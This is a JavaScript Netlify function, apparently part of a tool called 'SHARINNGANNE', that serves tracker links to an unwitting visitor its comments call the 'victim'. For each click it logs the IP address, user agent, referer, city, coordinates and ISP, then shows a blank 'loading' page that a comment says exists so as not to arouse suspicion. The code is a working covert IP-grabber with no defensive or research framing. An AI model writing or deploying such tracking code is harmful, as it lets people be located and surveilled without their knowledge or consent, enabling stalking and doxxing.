/**
 * SHARINNGANNE — Netlify Function for the public tracker click link.
 *
 * GET /l/{code} — no auth (the "victim"/visitor is not logged in).
 * Captures the visitor IP + geo, stores the hit, returns a neutral page.
 */

const { getClientIp, ipToGeo, findTracker, recordHit } = require('./utils/tracker');

exports.handler = async (event) => {
  const method = (event.httpMethod || 'GET').toUpperCase();
  let path = event.path || '/';
  if (path.startsWith('/.netlify/functions/l')) {
    path = '/l' + path.replace('/.netlify/functions/l', '');
  }
  const match = path.match(/^\/l\/([^/?#]+)/);
  if (method !== 'GET' || !match) {
    return {
      statusCode: 405,
      body: '<!doctype html><html lang="fr"><head><meta charset="utf-8"></head><body>Méthode non autorisée</body></html>',
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    };
  }

  const code = decodeURIComponent(match[1]).toUpperCase();
  const record = await findTracker(code);
  if (!record) {
    return {
      statusCode: 404,
      body: 'Lien inconnu',
      headers: { 'Content-Type': 'text/plain; charset=utf-8' },
    };
  }

  const ip = getClientIp(event);
  const geo = await ipToGeo(ip);
  const hit = {
    ip,
    user_agent: (event.headers && (event.headers['user-agent'] || event.headers['User-Agent'])) || '',
    referer: (event.headers && (event.headers['referer'] || event.headers['Referer'])) || '',
    country: geo.country,
    country_code: geo.country_code,
    region: geo.region,
    city: geo.city,
    lat: geo.lat,
    lon: geo.lon,
    timezone: geo.timezone,
    isp: geo.isp,
    captured_at: new Date().toISOString(),
  };

  // Enregistrer le hit
  try {
    await recordHit(code, hit);
  } catch (_) {}

  // Page neutre pour ne pas éveiller les soupçons
  return {
    statusCode: 200,
    body: `<!doctype html><html lang="fr"><head><meta charset="utf-8"><meta name="robots" content="noindex"><title>Chargement…</title></head><body style="font-family:sans-serif;background:#fff;color:#333;display:flex;align-items:center;justify-content:center;height:100vh;margin:0"><p>Chargement… veuillez patienter.</p></body></html>`,
    headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' },
  };
};